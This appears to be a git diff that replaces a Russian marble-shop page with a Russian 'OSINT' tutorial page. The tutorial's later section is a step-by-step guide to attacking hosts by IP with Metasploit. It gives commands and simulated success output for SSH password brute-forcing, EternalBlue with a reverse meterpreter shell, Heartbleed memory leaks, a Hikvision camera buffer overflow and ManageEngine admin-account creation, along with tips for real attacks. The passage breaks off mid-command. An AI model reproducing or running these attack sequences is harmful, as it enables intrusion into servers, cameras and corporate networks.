@@ -2,500 +2,535 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DolWall — Система Гибкого Мрамора (Bark уведомления)</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EliteArchangel | The Art of OSINT (Extended)</title>
     <style>
         :root {
-            --primary: #0a0a0a;
-            --gold: #c19b56;
-            --gold-light: #f4d093;
-            --white: #ffffff;
-            --bg: #fdfdfd;
-            --transition: all 0.7s cubic-bezier(0.19, 1, 0.22, 1);
+            --neon-cyan: #00fff2;
+            --neon-blue: #00d2ff;
+            --glass-white: rgba(255, 255, 255, 0.08);
+            --border-glow: rgba(0, 255, 242, 0.3);
+            --bg-deep: #02050a;
+            --term-bg: #0d1117;
+            --term-header: #222;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-
-        body { background: var(--bg); color: var(--primary); overflow-x: hidden; }
-        body.no-scroll { overflow: hidden; }
-
-        .btn, .intro-btn, .header-logo, .product-card, .cart-toggle-btn {
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background: linear-gradient(180deg, #1e528e 0%, #2989d8 50%, #7db9e8 100%);
+            background-attachment: fixed;
+            font-family: 'Segoe UI', Roboto, sans-serif; color: #fff;
+            overflow-x: hidden; -webkit-font-smoothing: antialiased;
         }
 
-        @keyframes reveal { from { opacity: 0; transform: translateY(60px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
-        @keyframes logo-glow { 0% { filter: drop-shadow(0 0 5px var(--gold)); } 50% { filter: drop-shadow(0 0 30px var(--gold-light)); } 100% { filter: drop-shadow(0 0 5px var(--gold)); } }
-        @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
-
-        .hidden { display: none !important; }
-        .fade-out { opacity: 0; pointer-events: none; transition: 1.5s cubic-bezier(0.4, 0, 0.2, 1); }
-
-        #introScreen {
+        /* --- ОБЛАКА (V2: РЕАЛИСТИЧНЫЙ ОБЪЕМ) --- */
+        .cloud-layer {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 10000; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; text-align: center;
+            z-index: 1; pointer-events: none;
         }
-        .intro-logo {
-            font-size: clamp(2.5rem, 10vw, 4.5rem); font-weight: 900; color: var(--white);
-            letter-spacing: 15px; margin-bottom: 40px; animation: logo-glow 3s infinite;
-        }
-        .intro-logo span { color: var(--gold); }
-        .intro-btn {
-            padding: 22px 60px; background: transparent; border: 2px solid var(--gold);
-            color: var(--gold); font-size: 1.1rem; cursor: pointer; border-radius: 60px;
-            transition: var(--transition); text-transform: uppercase; font-weight: 900;
-            box-shadow: 0 0 30px rgba(193, 155, 86, 0.2); letter-spacing: 2px;
-        }
-        .intro-btn:hover { background: var(--gold); color: #000; transform: scale(1.08) translateY(-5px); box-shadow: 0 20px 50px var(--gold); }
 
-        .modal-overlay {
+        .cotton-cloud {
+            position: absolute; background: #fff;
+            border-radius: 50%; filter: blur(35px);
+            opacity: 0.8; animation: drift linear infinite;
+        }
+
+        .c1 { width: 400px; height: 200px; top: 10%; left: -450px; animation-duration: 60s; box-shadow: 100px 100px 50px #fff; }
+        .c2 { width: 600px; height: 250px; top: 50%; left: -650px; animation-duration: 90s; opacity: 0.5; }
+        .c3 { width: 300px; height: 150px; top: 80%; left: -350px; animation-duration: 45s; box-shadow: -50px 50px 40px #fff; }
+
+        @keyframes drift {
+            from { transform: translateX(0) scale(1); }
+            to { transform: translateX(130vw) scale(1.1); }
+        }
+
+        /* --- ИНТРО: СБОРКА НИКНЕЙМА --- */
+        #intro-screen {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); backdrop-filter: blur(25px);
-            z-index: 9000; display: flex; justify-content: center; align-items: center;
-            opacity: 0; pointer-events: none; transition: 0.6s;
+            background: var(--bg-deep); z-index: 9999;
+            display: flex; justify-content: center; align-items: center;
         }
-        .modal-overlay.active { opacity: 1; pointer-events: all; }
-        .modal-content {
-            background: var(--white); width: 95%; max-width: 550px; padding: 60px;
-            border-radius: 40px; transform: scale(0.8); transition: 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            text-align: center;
-        }
-        .modal-overlay.active .modal-content { transform: scale(1); }
-        .input-group { margin-bottom: 25px; text-align: left; }
-        .input-group label { display: block; margin-bottom: 10px; font-size: 0.75rem; color: #bbb; text-transform: uppercase; letter-spacing: 2px; font-weight: 700; }
-        .input-group input {
-            width: 100%; padding: 20px; border: 2px solid #f0f0f0; border-radius: 20px;
-            font-size: 1rem; outline: none; transition: 0.4s; background: #fbfbfb;
-        }
-        .input-group input:focus { border-color: var(--gold); background: #fff; box-shadow: 0 15px 30px rgba(193, 155, 86, 0.15); }
 
-        header {
-            position: sticky; top: 0; background: rgba(255,255,255,0.9);
-            backdrop-filter: blur(20px); padding: 25px 5%; display: flex;
-            justify-content: space-between; align-items: center; z-index: 1000;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.03);
+        .nick-box { display: flex; perspective: 1000px; }
+
+        .letter-unit {
+            font-size: clamp(2rem, 8vw, 4.5rem); font-family: 'Courier New', monospace;
+            font-weight: 900; color: var(--neon-cyan); opacity: 0;
+            text-shadow: 0 0 25px var(--neon-blue);
+            display: inline-block;
+            animation: assembleLetter 2s cubic-bezier(0.19, 1, 0.22, 1) forwards;
         }
-        .header-logo { font-size: 2rem; font-weight: 900; letter-spacing: 4px; }
-        .header-logo span { color: var(--gold); }
+
+        @keyframes assembleLetter {
+            0% { transform: translate(var(--dx), var(--dy)) rotateX(180deg) rotateY(180deg) scale(0); opacity: 0; }
+            100% { transform: translate(0, 0) rotateX(0deg) rotateY(0deg) scale(1); opacity: 1; }
+        }
+
+        #flash-cs2 {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #fff; z-index: 10000; opacity: 0; pointer-events: none;
+        }
+        .bang { animation: flash-effect 4s ease-out forwards; }
+        @keyframes flash-effect {
+            0% { opacity: 0; } 5% { opacity: 1; } 35% { opacity: 1; } 100% { opacity: 0; }
+        }
+
+        /* --- ОСНОВНОЙ ПОРТАЛ --- */
+        #portal {
+            position: relative; z-index: 5; padding: 20px;
+            max-width: 1100px; margin: 0 auto; display: none;
+        }
+
+        .module {
+            background: var(--glass-white);
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--border-glow); border-radius: 24px;
+            padding: clamp(20px, 5vw, 40px); margin-bottom: 40px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+            transform: translateY(50px); opacity: 0;
+            transition: 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
+        }
+
+        .module.active { transform: translateY(0); opacity: 1; }
+
+        h1 { font-size: clamp(1.8rem, 5vw, 3.5rem); text-align: center; margin: 60px 0; letter-spacing: 5px; color: #fff; text-shadow: 0 0 20px var(--neon-cyan); }
+        h2 { color: var(--neon-cyan); font-family: 'Courier New', monospace; font-size: 1.6rem; margin-top: 0; }
         
-        .hero {
-            height: 55vh; background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.4)), 
-            url('https://images.unsplash.com/photo-1618221195710-dd6b41faaea6?auto=format&fit=crop&q=80&w=2000');
-            background-size: cover; background-position: center;
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            color: white; text-align: center; padding: 20px;
+        .meta-box {
+            background: rgba(0, 210, 255, 0.1); border-left: 4px solid var(--neon-blue);
+            padding: 15px; margin: 20px 0; font-style: italic; font-size: 1.05rem;
         }
 
-        .catalog-container { padding: 100px 5%; display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 50px; }
-        .product-card {
-            background: white; border-radius: 35px; overflow: hidden;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.05); transition: var(--transition);
-            animation: reveal 1.2s backwards; position: relative;
+        /* --- ОКНО ТЕРМИНАЛА KALI --- */
+        .terminal-window {
+            background: var(--term-bg); border-radius: 10px; overflow: hidden;
+            border: 1px solid #333; margin: 20px 0;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            font-family: 'Courier New', monospace;
         }
-        .product-card:hover { transform: translateY(-25px); box-shadow: 0 40px 80px rgba(0,0,0,0.15); }
-        .product-img { height: 420px; background-size: cover; background-position: center; transition: 1.5s transform; }
-        .product-card:hover .product-img { transform: scale(1.15); }
-        .product-price { position: absolute; top: 30px; right: 30px; background: rgba(0,0,0,0.85); color: var(--gold-light); padding: 12px 25px; border-radius: 60px; font-weight: 800; backdrop-filter: blur(10px); font-size: 1.1rem; }
-        .product-body { padding: 40px; text-align: center; }
-        .product-body h3 { font-size: 1.6rem; font-weight: 900; margin-bottom: 12px; }
-        .product-btn {
-            width: 100%; padding: 18px; background: var(--primary); color: white;
-            border: none; border-radius: 18px; cursor: pointer; transition: 0.5s;
-            font-weight: 800; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px;
+        .terminal-header {
+            background: var(--term-header); padding: 8px 12px;
+            display: flex; gap: 6px; align-items: center;
         }
-        .product-btn:hover { background: var(--gold); transform: translateY(-5px); box-shadow: 0 15px 30px rgba(193, 155, 86, 0.4); }
+        .dot { width: 10px; height: 10px; border-radius: 50%; }
+        .red { background: #ff5f56; }
+        .yellow { background: #ffbd2e; }
+        .green { background: #27c93f; }
+        .terminal-title { margin-left: auto; margin-right: auto; color: #888; font-size: 0.8rem; letter-spacing: 1px; }
 
-        .cart-sidebar {
-            position: fixed; top: 0; right: 0; width: 500px; height: 100%;
-            background: white; z-index: 9500; transform: translateX(100%);
-            transition: var(--transition); box-shadow: -30px 0 80px rgba(0,0,0,0.15);
-            display: flex; flex-direction: column; padding: 50px;
+        .terminal-body {
+            padding: 15px; font-size: 0.95rem; line-height: 1.5; color: #fff;
+            overflow-x: auto;
         }
-        .cart-sidebar.open { transform: translateX(0); }
-        .cart-item {
-            display: flex; justify-content: space-between; align-items: center;
-            padding: 25px 0; border-bottom: 2px solid #f8f8f8;
+        .prompt { color: #0f0; font-weight: bold; }
+        .path { color: #58a6ff; }
+        .cmd { color: #00ff99; }
+
+        .btn-link {
+            display: inline-block; padding: 12px 30px; margin: 10px 5px;
+            background: transparent; border: 1px solid var(--neon-cyan);
+            color: var(--neon-cyan); border-radius: 50px; text-decoration: none;
+            font-weight: bold; transition: 0.4s; text-transform: uppercase;
         }
+        .btn-link:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 25px var(--neon-cyan); }
 
-        #toastBox { position: fixed; bottom: 40px; right: 40px; z-index: 11000; }
-        .toast {
-            background: var(--primary); color: white; padding: 25px 35px;
-            border-radius: 20px; margin-top: 20px; display: flex; align-items: center;
-            gap: 20px; box-shadow: 0 30px 60px rgba(0,0,0,0.25); animation: slideIn 0.6s cubic-bezier(0.23, 1, 0.32, 1);
-            border-left: 8px solid var(--gold); font-weight: 600;
-        }
+        /* Таблицы для прозрачности */
+        table { width: 100%; border-collapse: collapse; margin: 20px 0; background: rgba(255,255,255,0.03); }
+        th, td { padding: 15px; border: 1px solid var(--border-glow); text-align: left; }
+        th { background: rgba(0, 255, 242, 0.1); color: var(--neon-cyan); }
 
-        .loader-icon { font-size: 5rem; color: var(--gold); margin-bottom: 35px; animation: rotate 2s linear infinite; }
-
-        @media (max-width: 768px) {
-            .cart-sidebar { width: 100%; }
-            .intro-logo { font-size: 2.8rem; letter-spacing: 8px; }
-            .modal-content { padding: 40px 25px; }
+        @media (max-width: 600px) {
+            .module { padding: 20px; }
+            .letter-unit { font-size: 1.8rem; }
         }
     </style>
 </head>
-<body class="no-scroll">
+<body>
 
-    <div id="toastBox"></div>
-
-    <div id="introScreen">
-        <div class="intro-logo">DOL<span>WALL</span></div>
-        <button class="intro-btn" onclick="startSystem()">Открыть коллекцию</button>
+    <div class="cloud-layer">
+        <div class="cotton-cloud c1"></div>
+        <div class="cotton-cloud c2"></div>
+        <div class="cotton-cloud c3"></div>
     </div>
 
-    <div id="regModal" class="modal-overlay">
-        <div class="modal-content">
-            <h2 style="margin-bottom: 40px; font-weight: 900; font-size: 2rem; letter-spacing: -1px;">Регистрация клиента</h2>
-            <div class="input-group">
-                <label>Фамилия(не обязательно)</label>
-                <input type="text" id="userLName" placeholder="Напр. Иванов">
-            </div>
-            <div class="input-group">
-                <label>Имя и Отчество (не обязательно)</label>
-                <input type="text" id="userFName" placeholder="Иван Иванович">
-            </div>
-            <div class="input-group">
-                <label>Контактный телефон</label>
-                <input type="tel" id="userPhone" placeholder="+7 (___) ___-__-__">
-            </div>
-            <div class="input-group">
-                <label>Точный адрес доставки</label>
-                <input type="text" id="userAddr" placeholder="Город, улица, дом, кв.">
-            </div>
-            <button class="intro-btn" style="width: 100%; border-radius: 20px; background: var(--primary); color: #fff; border: none;" onclick="completeReg()">Получить доступ</button>
-        </div>
+    <div id="intro-screen">
+        <div class="nick-box" id="nickname-assembly"></div>
     </div>
 
-    <div id="mainUI" class="hidden">
-        <header>
-            <div class="header-logo" style="cursor: pointer;" onclick="location.reload()">DOL<span>WALL</span></div>
-            <button class="intro-btn" style="padding: 12px 30px; font-size: 0.95rem;" onclick="toggleCart()">
-                <i class="fa-solid fa-bag-shopping" style="margin-right: 8px;"></i> Корзина (<span id="cartCount">0</span>)
-            </button>
-        </header>
+    <div id="flash-cs2"></div>
 
-        <div class="hero">
-            <h1 style="font-size: clamp(2.5rem, 8vw, 4.5rem); margin-bottom: 20px; font-weight: 900; letter-spacing: -2px;">ГИБКИЙ МРАМОР</h1>
-            <p style="color: var(--gold-light); letter-spacing: 6px; text-transform: uppercase; font-weight: 400; font-size: 0.9rem;">Искусство природного камня в вашем доме</p>
-        </div>
+    <div id="portal">
+        <h1>THE OSINT ARCHITECTURE</h1>
 
-        <div class="catalog-container" id="catalogGrid"></div>
-    </div>
-
-    <div id="cartBox" class="cart-sidebar">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 50px;">
-            <h2 style="font-size: 2.2rem; font-weight: 900;">Ваш заказ</h2>
-            <i class="fa-solid fa-circle-xmark" style="cursor: pointer; font-size: 2.5rem; color: #eee;" onclick="toggleCart()"></i>
-        </div>
-        <div id="cartItems" style="flex-grow: 1; overflow-y: auto; padding-right: 10px;"></div>
-        <div style="padding-top: 40px; border-top: 3px solid #f9f9f9; margin-top: 20px;">
-            <div style="display: flex; justify-content: space-between; font-weight: 900; font-size: 1.8rem; margin-bottom: 40px;">
-                <span>Итого:</span>
-                <span id="cartTotalSum">0₽</span>
+        <div class="module scroll-anim">
+            <h2>0x01: Username — Цифровой след в песке</h2>
+            <div class="meta-box">
+                Представь, что интернет — это огромный пляж. Юзернейм — это уникальный рисунок протектора твоих кроссовок. Куда бы ты ни пошел, ты оставляешь этот след. OSINT-мастер просто идет по этим следам от одной "песочницы" (сайта) к другой.
             </div>
-            <button class="intro-btn" style="width: 100%; background: #000; color: #fff; border: none; font-size: 1.2rem;" onclick="sendOrder()">Оформить покупку</button>
-        </div>
-    </div>
-
-    <div id="statusModal" class="modal-overlay">
-        <div class="modal-content">
-            <div id="waitBox">
-                <i class="fa-solid fa-compass loader-icon"></i>
-                <h3 style="font-size: 1.8rem; font-weight: 900; margin-bottom: 15px;">Ожидаем ответа менеджера...</h3>
-                <p style="color: #999; line-height: 1.6;">Менеджеру отправлено уведомление через Bark. Как только он подтвердит заказ — вы увидите результат.</p>
-            </div>
-            <div id="successBox" class="hidden">
-                <i class="fa-solid fa-crown" style="font-size: 6rem; color: var(--gold); margin-bottom: 30px; animation: bounce 2s infinite;"></i>
-                <h2 style="color: #27ae60; margin-bottom: 20px; font-size: 2.2rem; font-weight: 900;">ЗАКАЗ ОДОБРЕН!</h2>
-                <div style="background: #fbfbfb; padding: 35px; border-radius: 30px; margin-bottom: 35px; text-align: left; border: 1px solid #eee;">
-                    <p style="margin-bottom: 12px; font-size: 1.1rem;">💳 <b>Оплата:</b> СБП по номеру</p>
-                    <p style="margin-bottom: 12px; font-size: 1.1rem;">📞 <b>Телефон:</b> +7(912) 042-69-38</p>
-                    <p style="font-size: 1.1rem;">👤 <b>Владелец:</b> Долгов А.А.</p>
+            <p>Поиск по никнейму основан на <strong>теории повторного использования</strong>. Если человек зарегистрировался как "ArchZero" в Steam, с вероятностью 80% он под этим же именем сидит в Telegram или на форуме программистов.</p>
+            
+            <div class="terminal-window">
+                <div class="terminal-header">
+                    <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                    <div class="terminal-title">bash — user@kali</div>
                 </div>
-                <a href="https://t.me/dolgov_offical" class="intro-btn" style="text-decoration: none; display: block; background: #0088cc; color: #fff; border: none;">
-                    <i class="fa-brands fa-telegram"></i> Написать в Telegram
-                </a>
+                <div class="terminal-body">
+                    <span class="prompt">user@kali</span>:<span class="path">~</span>$ <span class="cmd">maigret EliteArchangel --tags</span><br>
+                    <span style="color: #666;">[SEARCHING...]</span><br>
+                    <span style="color: #0f9;">[+] Match found: GitHub (Developer, Python)</span><br>
+                    <span style="color: #0f9;">[+] Match found: Twitter (Yekaterinburg, 2026)</span>
+                </div>
             </div>
-            <div id="rejectedBox" class="hidden">
-                <i class="fa-solid fa-circle-xmark" style="font-size: 6rem; color: #e74c3c; margin-bottom: 30px;"></i>
-                <h2 style="color: #c0392b; margin-bottom: 20px; font-size: 2rem; font-weight: 900;">ЗАКАЗ ОТКЛОНЁН</h2>
-                <p style="font-size: 1.2rem;">Менеджер отклонил ваш заказ. Свяжитесь с нами для уточнения деталей.</p>
-                <a href="https://t.me/dolgov_offical" class="intro-btn" style="margin-top: 30px; text-decoration: none; display: inline-block; background: #0088cc; color: #fff; border: none;">
-                    <i class="fa-brands fa-telegram"></i> Написать в Telegram
-                </a>
+            <a href="https://github.com/soxoj/maigret" class="btn-link">Maigret GitHub</a>
+        </div>
+
+        <div class="module scroll-anim">
+            <h2>0x02: WHOIS — Паспорт дома в сети</h2>
+            <div class="meta-box">
+                WHOIS — это как выписка из реестра недвижимости. Вы можете увидеть, кто купил этот кусок "земли" (домен), когда истекает аренда и какой "телефонный номер" (DNS) к нему привязан.
+            </div>
+            <p>Этот протокол позволяет заглянуть за кулисы сайта. Даже если владелец скрыл данные, история WHOIS (Historical Data) может помнить, какой email был привязан к домену 5 лет назад.</p>
+        </div>
+
+        <div class="module scroll-anim">
+            <h2>0x03: Nmap — Стук в закрытые двери</h2>
+            <div class="meta-box">
+                Nmap — это как инспектор, который идет по темному коридору отеля и дергает за ручки каждой двери. Если дверь открыта, он заглядывает внутрь и спрашивает: "Кто тут живет?".
+            </div>
+            <table>
+                <tr>
+                    <th>Флаг</th>
+                    <th>Что делает (Метафора)</th>
+                </tr>
+                <tr>
+                    <td>-sS</td>
+                    <td><b>Тихий стук.</b> Вы проверяете дверь, но убегаете до того, как хозяин посмотрит в глазок.</td>
+                </tr>
+                <tr>
+                    <td>-sV</td>
+                    <td><b>Допрос.</b> Вы заставляете сервис представиться: "Я — сервер Apache версии 2.4".</td>
+                </tr>
+                <tr>
+                    <td>-Pn</td>
+                    <td><b>Штурм.</b> Вы не спрашиваете, дома ли кто-то (ping), а сразу лезете в окна (порты).</td>
+                </tr>
+            </table>
+        </div>
+
+      <div class="module scroll-anim">
+    <h2>0x04: Metasploit — Универсальная отмычка</h2>
+    <div class="meta-box">
+        Если Nmap нашел слабую дверь, Metasploit — это чемоданчик с тысячей разных ключей. Вам нужно просто выбрать правильный под конкретный замок.
+    </div>
+    <p>Это мощнейший фреймворк, где автоматизированы тысячи известных уязвимостей. Для работы с Android он использует <strong>Meterpreter</strong> — это как невидимый шпион, который поселяется внутри телефона и выполняет любые ваши приказы.</p>
+    
+    <div class="terminal-window">
+        <div class="terminal-header">
+            <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+            <div class="terminal-title">msfconsole</div>
+        </div>
+        <div class="terminal-body">
+            <span class="prompt">msf6</span> > <span class="cmd">use exploit/multi/handler</span><br>
+            <span style="color: #ff3366;"># Настройка приема сигнала от "шпиона"</span>
+        </div>
+    </div>
+    <a href="https://github.com/rapid7/metasploit-framework" class="btn-link">Metasploit Repo</a>
+    
+    <!-- НАЧАЛО НОВОГО РАСШИРЕННОГО БЛОКА ПОРТОВ -->
+    <div style="margin-top: 30px; border-top: 1px solid var(--border-glow); padding-top: 20px;">
+        <h3 style="color: var(--neon-cyan);">🎯 Полный гайд: Взлом по IP с Metasploit (порты 554, 443, 445, 22, 8022)</h3>
+        <p>Ниже приведена пошаговая тактика для каждого порта. В реальных атаках всегда начинай с <strong>nmap</strong>, затем сверяй баннеры с уязвимостями и используй <strong>search</strong> в Metasploit для поиска модуля.</p>
+        
+        <!-- 1️⃣ ПОРТ 22 (SSH) -->
+        <h4 style="color: #fff; margin-top: 25px;">🔐 1️⃣ Порт 22 (SSH) — брутфорс логинов</h4>
+        <p><strong>Сценарий:</strong> SSH часто используют для удаленного управления серверами. Если пароль слабый — можно подобрать.</p>
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                <div class="terminal-title">msfconsole</div>
+            </div>
+            <div class="terminal-body">
+                <span class="prompt">msf6</span> > <span class="cmd">search ssh_login</span><br>
+                <span style="color: #00ff99;">[+] Found auxiliary/scanner/ssh/ssh_login</span><br>
+                <span class="prompt">msf6</span> > <span class="cmd">use auxiliary/scanner/ssh/ssh_login</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssh/ssh_login)</span> > <span class="cmd">set RHOSTS 192.168.1.100</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssh/ssh_login)</span> > <span class="cmd">set USERNAME root</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssh/ssh_login)</span> > <span class="cmd">set PASS_FILE /usr/share/wordlists/rockyou.txt</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssh/ssh_login)</span> > <span class="cmd">set VERBOSE false</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssh/ssh_login)</span> > <span class="cmd">run</span><br>
+                <span style="color: #0f9;">[+] SSH - Success: 'root:123456'</span><br>
+                <span style="color: #0f9;">[*] Command shell session 1 opened (192.168.1.10:45678 -> 192.168.1.100:22)</span>
             </div>
         </div>
+        <p>✅ Если подобрал пароль — получишь шелл. Затем можно апгрейдить до meterpreter через <span class="cmd">sessions -u 1</span>.</p>
+
+        <!-- 2️⃣ ПОРТ 445 (SMB / EternalBlue) -->
+        <h4 style="color: #fff; margin-top: 25px;">💥 2️⃣ Порт 445 (SMB) — EternalBlue (MS17-010)</h4>
+        <p><strong>Сценарий:</strong> Легендарная уязвимость в SMBv1, позволяет удаленно выполнить код на Windows 7/2008/R2 без логина[reference:0]. Самая опасная дыра для корпоративных сетей.</p>
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                <div class="terminal-title">msfconsole</div>
+            </div>
+            <div class="terminal-body">
+                <span class="prompt">msf6</span> > <span class="cmd">search ms17-010</span><br>
+                <span style="color: #00ff99;">[+] exploit/windows/smb/ms17_010_eternalblue</span><br>
+                <span class="prompt">msf6</span> > <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span><br>
+                <span class="prompt">msf6 exploit(ms17_010_eternalblue)</span> > <span class="cmd">set RHOSTS 192.168.1.100</span><br>
+                <span class="prompt">msf6 exploit(ms17_010_eternalblue)</span> > <span class="cmd">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br>
+                <span class="prompt">msf6 exploit(ms17_010_eternalblue)</span> > <span class="cmd">set LHOST 192.168.1.10</span><br>
+                <span class="prompt">msf6 exploit(ms17_010_eternalblue)</span> > <span class="cmd">set LPORT 4444</span><br>
+                <span class="prompt">msf6 exploit(ms17_010_eternalblue)</span> > <span class="cmd">check</span><br>
+                <span style="color: #0f9;">[+] The target is vulnerable.</span><br>
+                <span class="prompt">msf6 exploit(ms17_010_eternalblue)</span> > <span class="cmd">exploit</span><br>
+                <span style="color: #0f9;">[*] Started reverse TCP handler on 192.168.1.10:4444</span><br>
+                <span style="color: #0f9;">[*] Sending stage (200774 bytes) to 192.168.1.100</span><br>
+                <span style="color: #0f9;">[*] Meterpreter session 2 opened</span>
+            </div>
+        </div>
+        <p>⚠️ EternalBlue — самый быстрый путь к SYSTEM на Windows. Но не забудь <strong>set ForceExploit true</strong>, если цель не определяется автоматически.</p>
+
+        <!-- 3️⃣ ПОРТ 443 (HTTPS / Heartbleed / Apache) -->
+        <h4 style="color: #fff; margin-top: 25px;">🔒 3️⃣ Порт 443 (HTTPS) — Heartbleed (CVE-2014-0160) и Apache модули</h4>
+        <p><strong>Сценарий:</strong> Если на 443 крутится старая версия OpenSSL, уязвимость Heartbleed позволяет читать память сервера (вплоть до приватных ключей)[reference:1]. А если там Apache с mod_ssl — может быть старая дыра (например, Kioptrix).</p>
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                <div class="terminal-title">msfconsole</div>
+            </div>
+            <div class="terminal-body">
+                <span class="prompt">msf6</span> > <span class="cmd">search heartbleed</span><br>
+                <span style="color: #00ff99;">[+] auxiliary/scanner/ssl/openssl_heartbleed</span><br>
+                <span class="prompt">msf6</span> > <span class="cmd">use auxiliary/scanner/ssl/openssl_heartbleed</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssl/openssl_heartbleed)</span> > <span class="cmd">set RHOSTS 192.168.1.100</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssl/openssl_heartbleed)</span> > <span class="cmd">set RPORT 443</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssl/openssl_heartbleed)</span> > <span class="cmd">set VERBOSE true</span><br>
+                <span class="prompt">msf6 auxiliary(scanner/ssl/openssl_heartbleed)</span> > <span class="cmd">run</span><br>
+                <span style="color: #0f9;">[+] Heartbleed vulnerability detected</span><br>
+                <span style="color: #ffaa00;">[!] Leaked 64 KB of memory — можно достать cookies, логины, ключи</span>
+            </div>
+        </div>
+        <p>📌 Если Heartbleed не сработал, попробуй <strong>auxiliary/scanner/http/ssl_version</strong> и <strong>exploit/multi/http/apache_mod_cgi_bash_env</strong> (Shellshock для Apache). Для реального шелла часто используют <strong>hta_server</strong> на 443 с фейковым сертификатом[reference:2].</p>
+
+        <!-- 4️⃣ ПОРТ 554 (RTSP — камеры и DVR) -->
+        <h4 style="color: #fff; margin-top: 25px;">📹 4️⃣ Порт 554 (RTSP) — взлом видеонаблюдения (Hikvision, DVR)</h4>
+        <p><strong>Сценарий:</strong> RTSP используют IP-камеры и видеорегистраторы. Многие имеют стандартные пароли или переполнение буфера[reference:3]. Например, Hikvision DVR уязвим через RTSP-запрос[reference:4].</p>
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                <div class="terminal-title">msfconsole</div>
+            </div>
+            <div class="terminal-body">
+                <span class="prompt">msf6</span> > <span class="cmd">search rtsp</span><br>
+                <span style="color: #00ff99;">[+] exploit/linux/misc/hikvision_rtsp_bof</span><br>
+                <span class="prompt">msf6</span> > <span class="cmd">use exploit/linux/misc/hikvision_rtsp_bof</span><br>
+                <span class="prompt">msf6 exploit(hikvision_rtsp_bof)</span> > <span class="cmd">set RHOST 192.168.1.200</span><br>
+                <span class="prompt">msf6 exploit(hikvision_rtsp_bof)</span> > <span class="cmd">set RPORT 554</span><br>
+                <span class="prompt">msf6 exploit(hikvision_rtsp_bof)</span> > <span class="cmd">set PAYLOAD linux/armle/meterpreter_reverse_tcp</span><br>
+                <span class="prompt">msf6 exploit(hikvision_rtsp_bof)</span> > <span class="cmd">set LHOST 192.168.1.10</span><br>
+                <span class="prompt">msf6 exploit(hikvision_rtsp_bof)</span> > <span class="cmd">exploit</span><br>
+                <span style="color: #0f9;">[*] Sending malicious RTSP request... </span><br>
+                <span style="color: #0f9;">[+] Buffer overflow triggered, shell obtained</span>
+            </div>
+        </div>
+        <p>🔍 Альтернатива — брутфорс стандартных логинов для RTSP (например, admin:admin). Также порт 8554 иногда дублирует RTSP[reference:5]. Используй <strong>auxiliary/scanner/rtsp/rtsp_login</strong>.</p>
+
+        <!-- 5️⃣ ПОРТ 8022 (ManageEngine Desktop Central) -->
+        <h4 style="color: #fff; margin-top: 25px;">💻 5️⃣ Порт 8022 — Desktop Central (управление IT-инфраструктурой)</h4>
+        <p><strong>Сценарий:</strong> ManageEngine Desktop Central 9 часто висит на 8022[reference:6]. Уязвимость позволяет создать админ-аккаунт через DCPluginServlet[reference:7].</p>
+        <div class="terminal-window">
+            <div class="terminal-header">
+                <div class="dot red"></div><div class="dot yellow"></div><div class="dot green"></div>
+                <div class="terminal-title">msfconsole</div>
+            </div>
+            <div class="terminal-body">
+                <span class="prompt">msf6</span> > <span class="cmd">search desktopcentral</span><br>
+                <span style="color: #00ff99;">[+] exploit/windows/http/manageengine_desktopcentral_admin_creat</span><br>
+                <span class="prompt">msf6</span> > <span class="cmd">use exploit/windows/http/manageengine_desktopcentral_admin_creat</span><br>
+                <span class="prompt">msf6 exploit(manageengine_desktopcentral_admin_creat)</span> > <span class="cmd">set RHOSTS 192.168.1.100</span><br>
